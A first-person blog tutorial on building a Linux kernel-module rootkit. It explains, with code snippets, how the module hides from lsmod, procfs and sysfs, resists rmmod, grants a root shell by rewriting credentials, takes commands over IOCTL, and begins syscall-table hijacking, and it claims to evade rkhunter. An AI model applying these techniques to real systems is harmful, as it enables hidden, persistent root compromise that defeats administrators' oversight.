# How did I approach making reveng_rtkit? 


### Why am I writing this blog?
I just wanted to share my experience with all of you guys/gals, which I learned while creating this LKM based rootkit.
- How I searched linux kernel source code to come up with an idea of which entry point to access (If you don't know entry point please, bare with me, I will late you know).
- How I implemented security concepts along with developing mindset.
- How I applied same concepts that was in market previously, in a different manner, so that my rootkit can bypass antirootkits (till now, it can bypass infamous rkhunter antirootkit).

And yes! ofcourse, I have taken help from other resourses like blog posts, YT videos, websites, githubs, etc.

I am just sharing all those techniques, xps (aquired while doing this project) and resourses, in order to avoid all those overhead pains of finding out those appropriate concepts/ snippets, related to this project, from all over the internet world, making things become easy as well as clear to you.

This blog will be pretty big, as I have documented all the informations that I have gathered in the three month period of making this project as well as this blog post. So, our journey will be pretty long. Let's buckle up our seat belts! and dive right in the world of LKM :wink:.

### Why did I wanted to make this project in the first place?

Last month, I was just reading about Linux Kernel from a famous book called, "Understanding Linux Kernel". I was reading but not quite getting all those concepts clearly. So,just like what all programmers say, "If you are not getting any concept well enough, try to code it." There is no such quote out there in the market lol!, I just made it up, but you get the idea, right?

While reading and researching those topics, I found out about Linux kernel Module, device drivers. Actually, I watched [LiveOverflow](https://www.youtube.com/watch?v=juGNPLdjLH4) where I was introduced to Linux Device Driver via this website: [LDD3](https://lwn.net/Kernel/LDD3/). I saw that Linux kernel code is full of circular doubly-linked list structures to reduce the amount of duplicated code. But I was totally noob with linked list. I followed this [YT video](https://www.youtube.com/watch?v=_jQhALI4ujg) to know the concept of it and [geeksforgeeks](https://www.geeksforgeeks.org/linked-list-set-1-introduction/) for knowing how to code simple linked lists. According to me, these would be enough for understanding all those linked lists present in linux kernel.
While doing this, side by side, I was also doing linux function hooking(user mode). From there, it struck me that when it comes to **hooking** in kernel, then **syscall** (aka System call) is the one. From there, I started researching about `Syscalls` and `syscall interception and hooking`. Then it again gave me a vision that if we can intercept normal syscall and hook them with our very own custom made syscall, we can easily manipulate the linux kernel, just like the concept of User Mode functional hooking. Manipulating Linux Kernel (or kernel of any OS) can be done by one specfic kind of malware, ***`Rootkit` !!***

And as it is related to manipulating linux kernel workings, I threw spotlight over **Linux kernel based rootkit** (aka **Linux Loadable Kernel Module / LKM based rootkit**).

> ***NOTE***: &nbsp; Those things which are not present online, or some concept which I want to discuss in my very own language, would be discussed in this blog, else I would be sharing links, using which I learned myself.

------
------
#### Part1: Basics regrading LKM creation
1. LKM creation: I followed [thegeekstuff](https://www.thegeekstuff.com/2012/04/linux-lkm-basics/) and pentesteracademy's [github-001](https://github.com/pentesteracademy/linux-rootkits-red-blue-teams/tree/master/001-helloworld)
2. Information about `print in kernel` (aka printk): [kernel.org](https://www.kernel.org/doc/html/latest/core-api/printk-basics.html) and pentesteracademy's [github-002](https://github.com/pentesteracademy/linux-rootkits-red-blue-teams/tree/master/003-helloworld-printk)

So, if you have followed those links throughly, I think you are good to go.!
We created a LKM which can be run in kernel (we will only use KERN_INFO/pr_info, we won't be using KERN_ALERT and KERN_EMERG, etc. in our rootkit LKM ):

### NOTE:
> To follow this blog accurately (i.e. with same linux kernel version: `5.11.0-49-generic`), you **have** to install custom Linux kernel on your own.

Otherwise, you can follow this blog with ease, if your linux kernel version is greater than ***5.7***.

![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog1.png?raw=true)
<p align="center">
    This is actually the "hello world" code offered by pentester academy.
</p>

Preety much like this, right?

So, we inserted that LKM into kernel, but how can we see it?

There are several methods to see inserted module name in kernel but at first I will show the traditional way of seeing it.
```
$ lsmod
```
![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog2.png?raw=true)

Other three methods are:

1. _`/proc/modules`_ file (procfs)
    - It is actually a virtual filesystem resides in RAM which shows all **User** as well as **Kernel mode** running processes to _User mode side users_.

![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog3.png?raw=true)

2. _`/proc/kallsyms`_ file (procfs)
    - Extracts and stores all the non-stack/dynamically loaded kernel modules symbols and builds a data blob that can be linked into that kernel for use by debuggers.
    - In other words, it has the whole kernel mapping in one place.
    - This means, this file will also store symbols from our already loaded rootkit LKM.

![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog4.png?raw=true)

3. _`/sys/module/[THIS_MODULE]/`_ directory (sysfs)
    - It is also a virtual filesystem resides in RAM.
    - The only difference between sysfs and procfs is the ***mapping capability*** of sysfs.
    - It maps <ins>kernel subsystem</ins>, <ins>device drivers</ins> in their <ins>hierarchical order</ins>.
    - Each entry in `/sys` is represented by **kobject structure**. Each module has its <ins>own kobject</ins>.

![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog5.png?raw=true)

So, if we assume our `hello world` LKM as rootkit, we have to hide it from these **four** areas, right?
Else, if it is visible, it would be easily be seen by Admins., which would make them alert.

**NOTE**:
```
fs => file system
```
##### So, let's hide it...
-----
#### Part2: Hiding LKM from _lsmod_,  _/proc/modules_ file, _/proc/kallsyms_ file and _/sys/module/[THIS_MODULE]/_ directory:

We can eradicate first <ins>three problems</ins> by simply deleting **our rootkit module** from that _structure_ which is responsible for storing it as a **LKM**.

Before starting the Coding portion, I just want to share one resource with you all. In LKM programming, we all know that we have to use inbuilt linux kernel functions, right?
But how to search for those functions in internet?
There is no online Linux Kernel function documentation present out there in public. You can get few help, if someone individual have written some blog/ posted any query relating to Linux Kernel Programming. Apart from that, there is no other documentations present in web, unlike WinAPI targeting Windows. To mitigate that issue, developers created this website: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source) which hosts Linux kernel source codes. This would help programmers to search specific program functions or go through source code of certain kernel modules without any headache. There are also other websites like this, [lxr.sourceforge.io](https://lxr.sourceforge.io/en/index.php), [gnu.org](https://www.gnu.org/software/global/) and [oracle.github.io](https://oracle.github.io/opengrok/), but we gonna use this: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source), as found it more handy.

The way to use elixir.bootlin:

![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog6.png?raw=true)

You can also use linux local source code which comes prepackaged with very linux distribution. To access those source code, jump move to `/lib/modules/<kernel version>/build/include/` directory. To search through those would be quite hectic, rather following elixir.bootlin would be my suggesion.

1. Targeting _"lsmod"_, _"/proc/modules"_ file, and _"/proc/kallsyms"_ file

&nbsp;
  Function name, where it is implemented in my project: [proc_lsmod_hide_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L45)
&nbsp;
  In header file named ***"module.h"***, structure named, **struct module** is present, in which there is a member named, **list** (struct list_head list) is defined, which is actually responsible for storing **all list of loaded LKMs**.
  We will be deleting our rootkit module from `list` right? Here, THIS_MODULE is acting as a pointer to a "module structure". Our rootkit module will be represented by THIS_MODULE.
&nbsp;
```c
    // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
    // elixir.bootlin: pattern: module

    struct module {
    ...
    /* Member of list of modules */
    struct list_head list;
    ...
    };
    ```
    `struct list_head` can be found in header file named ***"list.h"***.
    ```c
    // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
    // elixir.bootlin: pattern: list

    struct list_head {
        struct list_head *next, *prev;
    };
```
We're gonna delete our rootkit LKM using `list_del()`, which is present in the very same header file.
```c
    // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
    // elixir.bootlin: pattern: list

    /**
    * list_del - deletes entry from list.
    * @entry: the element to delete from the list.
    * Note: list_empty() on entry does not return true after this, the entry is
    * in an undefined state.
    */
    
    static inline void list_del(struct list_head *entry)
    {
      __list_del_entry(entry);
      entry->next = LIST_POISON1;
      entry->prev = LIST_POISON2;
    }
```
So,
```
    // parameter to be inputed to list_del():

    &THIS_MODULE->list
```

![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog7.png?raw=true)

> ***Now we can hide our rootkit LKM from **_`lsmod`_ command, _`/proc/modules`_ file (procfs)** and **_`/proc/kallsyms`_ file (procfs) !***

2. Targeting _/sys/modules_ directory

    Function name, where it is implemented in my project: [sys_module_hide_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L85)

    Then,
    What about _"/sys/module/<THIS_MODULE>/"_ directory ?

    I searched "kobject" pattern in _"/lib/modules/5.11.0-49-generic/build/include/linux/module.h"_ path and I got the structure named, "**module_kobject**"

```c
    // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
    // elixir.bootlin: pattern: kobject

    struct module {
          ...
          /* Sysfs stuff. */
        struct module_kobject mkobj;
        struct module_attribute *modinfo_attrs;
        const char *version;
        const char *srcversion;
        struct kobject *holders_dir;
        ...
        };
```
We can see this very portion of structure named **module** is responsible for _`/* Sysfs stuff. */`_.
    So, we became sure _"module_kobject"_ can be the one.

I searched again but now with "module_kobject" pattern in the same path, to see where is this structure used. Fortunately, that very part is documented well enough to save me (=n00b) from eyeballing all around the gigantic _"module.h"_ file. Although there is no guarantee that I would have become sure that _"module_kobject"_ gonna be the main point of attraction even after searching through the whole file in absence of documentation.

So, thanks to <ins>Kernel Developers!!!</ins>.

Anyways...
```c
    // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
    // elixir.bootlin: pattern: module_kobject

    struct module_kobject {
              struct kobject kobj;
              struct module *mod;
              struct kobject *drivers_dir;
              struct module_param_attrs *mp;
              struct completion *kobj_completion;
    } __randomize_layout;
```
&nbsp;
    So now, we can see that _"module_kobject"_ has member named _"struct kobject kobj"_.
    Lets find out **kobject structure**.
&nbsp;
    It is present in _"/lib/modules/5.11.0-49-generic/build/include/linux/kobject.h"_ path.
```c
    // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kobject.h
    // elixir.bootlin: pattern: kobject
    struct kobject {
          ...
          struct list_head        entry;
          ...
    };
```
&nbsp;
    `struct list_head` can be found in header file named ***"list.h"***.
```c
    // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
    // elixir.bootlin: pattern: list_head

    struct  list_head {
        struct list_head *next, *prev;
    };
```
Again the same case, just like **procfs** and **lsmod** scenario. We will simply delete the **kobject mapping of our rootkit module** from that structure which is responsible for storing it as a LKM kobject.
    
In header file named ***"kobject.h"***, structure named, **struct kobject** is present, in which there is a member named, **entry** (struct list_head entry) is defined, which is actually responsible for storing **kobject mapping caused due to our loaded rootkit LKM**./
    
We're gonna delete 2 things:
1. Delete our rootkit LKM from **`/sys/module/`** directory with the help of `kobject_del()`.
But what will be our <ins>parameter value</ins>?

We will be deleting our module right? It will be expressed by `THIS_MODULE`. So we will deleting `THIS_MODULE` in such a way that kobject related to it also gets deleted.
```c
          // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kobject.h
          // elixir.bootlin: pattern: kobject_del

          extern void kobject_del(struct kobject *kobj);
```
```c
          // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
          // elixir.bootlin: pattern: module

          struct module {
                ...
                /* Sysfs stuff. */
                struct module_kobject mkobj;
                ...
                };
```
```c
          //pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
          // elixir.bootlin: pattern: module_kobject

          struct module_kobject {
          struct kobject kobj;
	        struct module *mod;
	        struct kobject *drivers_dir;
  	      struct module_param_attrs *mp;
	        struct completion *kobj_completion;
          } __randomize_layout;
```
```c
          // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kobject.h
          // elixir.bootlin: pattern: kobject

          struct kobject {
	              const char		*name;
	              struct list_head	entry;
  	            struct kobject		*parent;
	              struct kset		*kset;
	              struct kobj_type	*ktype;
  	            struct kernfs_node	*sd; /* sysfs directory entry */
	              struct kref		kref;
              #ifdef CONFIG_DEBUG_KOBJECT_RELEASE
	              struct delayed_work	release;
              #endif
	              unsigned int state_initialized:1;
	              unsigned int state_in_sysfs:1;
	              unsigned int state_add_uevent_sent:1;
	              unsigned int state_remove_uevent_sent:1;
	              unsigned int uevent_suppress:1;
          };
```
```
          // parameter to be inputed to kobject_del():

          &THIS_MODULE->mkobj.kobj
```
2. Delete the kobject, which is mapped by our rootkit LKM from "entry" list using `list_del()`. We will be using the same `list_del()` function that we used before to delete our rootkit LKM from _`lsmod`_ command, _`/proc/modules`_ file (procfs) and _`/proc/kallsyms`_ file (procfs), but this time with different <ins>parameter value</ins>. [source: [page-6-last-paragraph](https://theswissbay.ch/pdf/Whitepaper/Writing%20a%20simple%20rootkit%20for%20Linux%20-%20Ormi.pdf)]
```c
          // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kobject.h
          // elixir.bootlin: pattern: entry

          struct kobject {
                  ...
                  struct list_head        entry;
                  ...
          };
          ```
          ```
          //parameter to be inputed to list_del() in this scenario:
          /*
           * 1. THIS_MODULE
           * 2. mkobj
           * 3. kobj
           * 4. entry
           */
    
          &THIS_MODULE->mkobj.kobj.entry
```
1st three, (1,2,3) are just the same as previous case. Just adding `entry` in this context.
    
> ***Now we can hide our rootkit LKM from **`/sys/module/`** directory (_LKM logging directory_) !***

![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog8.png?raw=true)

##### But there is a problem to use this function. We cannot re-enable our LKM rootkit to `show` mode again, i.e., we can't `rmmod` the rootkit according to our will. The only way left is rebooting the whole machine. link: [reveng_rtkit repo](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L94). I will explain it later in this blog.
----
#### Part3: Revealing LKM from _lsmod_,  _/proc/modules_ file, _/proc/kallsyms_ file and _/sys/module/[THIS_MODULE]/_ directory according to our will:
1. Targeting _"lsmod"_, _"/proc/modules"_ file, and _"/proc/kallsyms"_ file

Function name, where it is implemented in my project: [proc_lsmod_show_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L125)

   1. In `proc_lsmod_show_rootkit()`, our rootkit module is just added back to main list of modules, where it was previously.
   2. We will actually store the location of the previously loaded LKM so that we can add our loaded rootkit LKM just after that particular stored location, later according to our need. This also helps to preserve the <ins>Serial order of our rootkit LKM</ins> to avoid suspicion.

        **For adding our loaded <ins>rootkit LKM</ins> back to the main module linked list**:
```c
          // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/list.h
          // elixir.bootlin: pattern: list_add

          /**
          * list_add - add a new entry
          * @new: new entry to be added
          * @head: list head to add it after
          *
          * Insert a new entry after the specified head.
          * This is good for implementing stacks.
          */
          static inline void list_add(struct list_head *new, struct list_head *head)
          {
                  __list_add(new, head, head->next);
          }

```
----
2. Targeting _"/sys/module/"_ directory:

    Function name, where it is implemented in my project: [sys_module_show_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L155)

    I have told you guys/gals earlier in my [README.md](https://github.com/reveng007/reveng_rtkit#note) file that I haven't used _tidy()_, _sys_module_hide_rootkit()_ and _sys_module_show_rootkit()_. Now, I will be discussing about the reasons behind that decision.

    Under the title, [**Part2: Hiding LKM from _lsmod_,  _/proc/modules_ file, _/proc/kallsyms_ file and _/sys/module/[THIS_MODULE]/_ directory**](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#part2-hiding-lkm-from-lsmod--procmodules-file-prockallsyms-file-and-sysmodulethis_module-directory) in the last para of Targeting _/sys/module/_ directory, I have told that we can't re-add our rootkit's entry point to the responsible linkedlist once we have removed that particular kernel object of our rootkit LKM. 

    I will only be explaining the core part related to _"/sys/module/"_ here, the `IOCTL portion` is discussed in the later portion of the blog.

    According to [Page: 7 theswissbay.pdf](https://theswissbay.ch/pdf/Whitepaper/Writing%20a%20simple%20rootkit%20for%20Linux%20-%20Ormi.pdf), the tidy() function is used to do some "cleanups", i.e., setting some pointers to NULL.

    If we don't set some pointers to NULL, we can cause Oops during unloading rootkit. This is because, during unloading a module, Kernel will delete entry in _/sys/module_ directory for that module. As we have already deleted that entry, kernel can't find that specific entry for our LKM module in _/sys/module_ directory to delete it, therefore kernel can't unload our rootkit LKM.

    ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/unable_to_rmmod.png?raw=true)

    In this case, tidy() function is not used. 

    It is the tidy() function, that I have used: [Page: 15 theswissbay.pdf](https://theswissbay.ch/pdf/Whitepaper/Writing%20a%20simple%20rootkit%20for%20Linux%20-%20Ormi.pdf)

    I have implemented the `tidy()` in the entry function my rtkit.c file (rootkit_init()). Just uncomment `tidy()` from [line:111](https://github.com/reveng007/reveng_rtkit/blob/47dad2e251b80a46999c84507befded6c521933e/kernel_src/reveng_rtkit.c#L111) and [line:294](https://github.com/reveng007/reveng_rtkit/blob/47dad2e251b80a46999c84507befded6c521933e/kernel_src/reveng_rtkit.c#L294).
    Then also, I got the same result. 

    ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/unable_to_rmmod.png?raw=true)

    I was searching for other ways, like using any function related to kobject. I found out [kobject_add()](https://kernel.org/doc/html/latest/driver-api/basics.html#c.kobject_add), which I have implemented in [sys_module_show_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/d9a83f3b94b8aa5206ff46b09b356360ba584649/kernel_src/include/hide_show_helper.h#L155). Then also I found no result. 

    This the reason why I have added this [NOTE](https://github.com/reveng007/reveng_rtkit#note) in the README.md file of the **reveng_rtkit** repo.

    If you viewers have any idea of how to hide our LKM from `/sys/module/` without creating any discrepancies, in order to deceive usermode programs, please let me know. If I get any other method to get away with this very scenario, I will be updating my LKM rootkit as well as this blog based on that.

#### Part4: Protecting LKM from from being rmmod'ed (or unremovable):

Function name, where it is implemented in my project: [protect_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L165)

I took this concept from [nurupo's](https://github.com/nurupo) repo named: [rootkit](https://github.com/nurupo/rootkit/blob/56c43b3cc74f0db4739065d9276fcf1236273c5a/rootkit.c#L606). We will be using `try_module_get()` kernel function from `module.h` library in order to protect our LKM rootkit from being rmmod'ed.

```c
// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
// elixir.bootlin: pattern: try_module_get

/* This is the Right Way to get a module: if it fails, it's being removed,
 * so pretend it's not there. */
extern bool try_module_get(struct module *module);
```
----
#### Part5: Making LKM removable from kernel (Incase needed):

Function name, where it is implemented in my project: [remove_rootkit()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L188)

I also took this concept from [nurupo's](https://github.com/nurupo) repo named: [rootkit](https://github.com/nurupo/rootkit/blob/56c43b3cc74f0db4739065d9276fcf1236273c5a/rootkit.c#L622). We will be using `module_put()` kernel function from `module.h` library in order to protect our LKM rootkit from being rmmod'ed.

```c
// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
// elixir.bootlin: pattern: module_put

extern void module_put(struct module *module);
```
-----

#### Part6: Providing rootshell to the attacker:

Function name, where it is implemented in my project: [set_root()](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hook_syscall_helper.h#L237). 

I took this mechanism from [xcellerator-changing-credentials](https://xcellerator.github.io/posts/linux_rootkits_03/#changing-credentials) blog post.
I haven't followed the whole portion present under the **changing-credentials** title of the xcellerator blog post, I only followed the core part of it.

So, according to Torvald's [documentation](https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials), to alter the current process's credentials, a function should first prepare a new set of credentials by calling:
```
struct cred *prepare_creds(void);
```
and

When the credential set is ready, it should be committed to the current process by calling:
```
int commit_creds(struct cred *new);
```
So, this implies that we have to work with `cred struct`, right?
```c
// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/cred.h
// elixir.bootlin: pattern: cred

struct cred {
		...
	 	kuid_t		uid;		// real UID of the task
	 	kgid_t		gid;		// real GID of the task 
		kuid_t		suid;		// saved UID of the task
	 	kgid_t		sgid;		// saved GID of the task
	 	kuid_t		euid;		// effective UID of the task
	 	kgid_t		egid;		// effective GID of the task
	 	kuid_t		fsuid;		// UID for VFS ops
	 	kgid_t		fsgid;		// GID for VFS ops
	 	...
    };

	...
  extern struct cred *prepare_creds(void);
  ...
  extern int commit_creds(struct cred *);
```
We will set all the members of cred struct to zero (=0) to get root shell.

If you now go and check out my code portion, you will understand the scenario.

#### Part7: Interracting with LKM in **kernel** from **Userspace**:

Till now, We all came to know how to do stuff in kernel using LKM rootkit. But how to control the LKM rootkit? how to send command to the rootkit via userspace?

According to my knowledge, it can be done in 2 ways:
1. `IOCTL(Input Output ConTroL) method`
2. `Syscall Interception/ Hijacking method`

I tried my level best to demonstrate both the type of working from my rootkit's perspective in a diagrammatic workflow.

![](https://github.com/reveng007/reveng_rtkit/blob/main/reveng_rtkit_mechanism.jpeg?raw=true)

1. ***`IOCTL(Input Output ConTroL) method`***:

    File name, where it is implemented in my project: [reveng_rtkit.c](https://github.com/reveng007/reveng_rtkit/blob/main/kernel_src/reveng_rtkit.c).

    A brilliant resource related to the theory behind IOCTL is present here: [sysprog21.github.io-talking-to-device-files-1st_4_paragraphs](https://sysprog21.github.io/lkmpg/#talking-to-device-files).

    To perform IOCTL, we need two set of C code:
    1. ***LKM with IOCTL features(or Device Driver)***
    2. ***Usermode C code***, in order to communicate with the target _LKM_.

        Basically, a usermode application will be created to communicate with LKM in kernel via a character device file, which will already be _registered_ by our ***LKM rootkit***.
        As, Usermode application will only send command to LKM in kernel, it will only perform `IOCTL write` to the already registered _Character Device file_
        ```c
        #define WR_VALUE _IOW('a','a',int32_t*)
        ...
        ...
        ...
        ioctl(fd, WR_VALUE, (char*) str);
        ```
        
        and the LKM will perform `IOCTL read` from the registered _Character Device file_ to read the command and compare those commands with the hardcoded commands which are present in LKM, if those commands satisfies the condition, LKM will show output/message on _`the Kernel Log`_.
        I also included the `IOCTL write` feature to the LKM so that if we (attacker) wants to change/ append some value to the registered Character Device Driver present in `/dev` directory named, `etx_device` externally, we will get to see the notification message being logged in _`the Kernel Log`_.
        
        This LKM will also act as a ***Device Driver*** to handle `/dev/etx_device` Device file, [source-1st_para](https://sysprog21.github.io/lkmpg/#registering-a-device).
        
        The IOCTL portion that is used in my project is taken from Embetronicx [github](https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/driver.c) repo.

        It wasn't possible for me to choke out the whole code snippets related to IOCTL to a single place in order to make it easy for the viewers to understand. It will be upon the viewers to look at the code and compare that with the above mentioned link.

        -----

        #### NOTE:
        Every Console has log level called as the **Console log level**.\
        Any message with a log level number **lesser** than the **Console log level** gets <ins>displayed on the Console</ins>.\
        Eg:\
        Log level < Console log level\
        => log level gets displayed on the console
          
        Other messages with log level >= Console log level, are logged in the kernel log, which can be looked into using command "dmesg".
        
        The Console log level can be found by:

        For more information about Linux Log level: [visit-linuxconfig.org](https://linuxconfig.org/introduction-to-the-linux-kernel-log-levels).
        
        -----
        Let's discuss the ***IOCTL method in LKM*** bit by bit:

          1. Use cases of the libraries that were used for IOCTL purposes:
          ```c
          #include <linux/fs.h>           /* Related to file structure */
          #include <linux/cdev.h>         /* Character device related stuff */
          #include <linux/device.h>       /* device_create() and device_destroy() */
          #include <linux/device/class.h> /* class_create() and class_destroy() */
          #include <linux/uaccess.h>      /* copy_to_user() and copy_from_user() */
          #include <linux/ioctl.h>        /* IOCTL operation */
          ```
          Other libraries that were mentioned in Embetronicx [github](https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/driver.c) repo relating to IOCTL, is not needed according to my knowledge acquired after creating the reveng_rtkit project.
        
        ### NOTE:
        > If any viewers see, using those omitted libraries are essential, please let me know!
        
        2. For reading and writing into device files:
        ```c
        #define WR_VALUE _IOW('a','a',int32_t*)
        #define RD_VALUE _IOR('a','b',int32_t*)
        ```
        Format of writing macro to manipulate device file: `#define “IOCTL Type” _IO(num1, num2, argument type)`, [source](https://linuxhint.com/c-ioctl-function-usage/).

        3. In order to read commands from registered Character Device Driver (i.e. commands which are stored inside Character Device Driver from <ins>Userspace</ins>), I created an array named **`value`** with size of MAX_LIMIT(=20) to store it and be compared against those provided/hardcoded commands present in the rootkit.

        ```c
        // For size of array
        #define MAX_LIMIT 20

        // To copy value from userspace
        char value[MAX_LIMIT];
        ```
        ```c
        // =========================== Available Commands =======================

        static char rootkit_hide[] = "hide";            // command to hide rootkit => In this mode, in no way this rootkit be removable => rootkit_remove will not work
        static char rootkit_show[] = "show";            // command to unhide rootkit => In this mode, rootkit_protect and rootkit_remove will work effectively
        static char rootkit_protect[] = "protect";      // command to make rootkit unremovable (even if it can be seen in usermode).
        static char rootkit_remove[] = "remove";        // command to make rootkit removable
        static char process[] = "process";              // command to hide/unhide running process/implant
        static char root[] = "root";                    // command to get root shell  
        ```
        The array named **`value`** will be checked against these above mentioned commands, to perform specific tasks.
        ```c
        // ======= This function will be called when somebody write IOCTL on the Device file =====

        static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
        {
        switch(cmd) {
                case WR_VALUE:
                        /*
                         * copy_from_user():
                         * - a direct read from the userspace address and write to the kernelspace address
                         * Or, Copy data from User space to Kernel Space
                         */
                        if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT) )
                        {
                                pr_err("Data Write : Err!\n");
                        }
                        pr_info("               Value got from device file= %s\n", value);

                        ...
                        ...
                    }
        }
        ```
        I'm skipping all those string comparisons present after this snippet, as it is pretty much an easy thing to understand, same as C programming in Usermode.

        4. Registering and Unregistering the Character Device:
        If you follow my project [repo](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L322), you can get the concept of registering, initializing and unregistering the character device file.

            Just declare and intialize these variables, first:
            ```c
            // Needed for creating/registering and adding Character device to system
            dev_t dev = 0;
            static struct class *dev_class;
            static struct cdev etx_cdev;
            ```

        5. What about ***`struct file_operations`***?
        In my [repo](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L81), this portion is also well documented.
        This structure is actually essential for interracting with ***`Device Files`*** by ***`Device Drivers`***.
            ```c
            static struct file_operations fops =
            {
                .owner          = THIS_MODULE,
                .read           = etx_read,
                .write          = etx_write,
                .open           = etx_open,
                .unlocked_ioctl = etx_ioctl,
                .release        = etx_release,
            };
            ```
            I then made functions named:
            `etx_read`, it will be triggered when somebody tries to read the Character Device file.
            `etx_write`, it will be triggered when somebody tries to write into the Character Device file.
            `etx_open`, it will be triggered when we open the Character Device file.
            `etx_release`, it will be triggered when we close the Character Device file.
            `etx_ioctl`, it will be triggered when somebody performs IOCTL onto the Character Device file.

        It was all to know about **IOCTL** in **Kernelmode**, now let's jump to the ***Usermode IOCTL method***. After knowing the details of Kernelmode IOCTL, _Usermode IOCTL_ will be easy.

        The code is present in [here](https://github.com/reveng007/reveng_rtkit/blob/main/user_src/client_usermode.c). I followed Embetronicx [github](https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/test_app.c) repo. I don't think this code needs that much of explanation to explain it's working, it's pretty much self-explanatory.

        ### NOTE:
        > I heardly found any rootkit utilizing IOCTL mechanism in them, those which I found are honestly, out of my grasp, so I thought that I should give it a go and thus, implemented one in my rootkit despite keeping the ultimate goal the same as other public rootkits. This actually helped to `bypass` _signature detection_ of **rkhunter antirootkit**. [visit](https://github.com/reveng007/reveng_rtkit#bypassing-rkhunter-antirootkit).

  2. ***`Syscall Interception/ Hijacking method`***:

      If you are new to the field of systemcall, you can read this intro blog on [linux syscalls](https://www.geeksforgeeks.org/introduction-of-system-call/).

      So, I think now you have a little bit of understanding of what systemcall is, right?
&nbsp;
We will use, rather misuse systemcall to communicate between usermode and kernel mode and grab our ultimate cookie :cookie:.
      This is the main/common thing for which a LKM based rootkit is famous for. There are many methods to perform **Syscall interception** in Linux.

   I followed this [blog: foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall](https://foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall-s-7001cc02a1e6) to know all the available linux syscall interception techniques./
      I implemented the ***Syscall table hijacking*** technique. Personally, I liked the **`sys_close syscall function`** technique but the sys_close syscall function is ***not*** exported any more since **`kernel version: 4.17.0`**([Source: sys_close](https://github.com/NoviceLive/research-rootkit/issues/3)), so discarded.

   I found another [blog: infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking](https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c) on _different_ types of ***Syscall table hijacking*** techniques that are available in the market.
      I liked the **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique as it is an easy to go solution to perform <ins>hooking</ins>. 
      But, there is a _caveat_!
      This function is not exported anymore by default from **`kernel versions: 5.7.0`** onwards,[[Source: xcellerator](https://github.com/xcellerator/linux_kernel_hacking/issues/3)]. We have to make some tweaks to get around this. I will be explaining that soon. Just like `kallsyms_lookup_name` symbol, `sys_call_table` is also **not** exported, actually to prevent misuse that we are targeting to make.
      
   I'm dividing all those steps from getting the `address of syscall table` to <ins>hooking</ins> `individual syscalls` pointwise which are discussed in the aforementioned blog post.

   #### Step1: <ins>Finding the address of the `syscall table`, which is represented by `sys_call_table` symbol</ins>.

   So, what the heck is syscall table?
        It is actually a table which maps linux syscalls to their corresponding syscall ids which are mapped with their corresponding kernel address.
        
   It is somewhat like this.
        ![](https://docs.microsoft.com/en-us/security/research/project-freta/media/report-kernel-syscalls.png?raw=true)

### NOTE:
```
        This is actually the "syscall table" for windows but the concept is same.
```
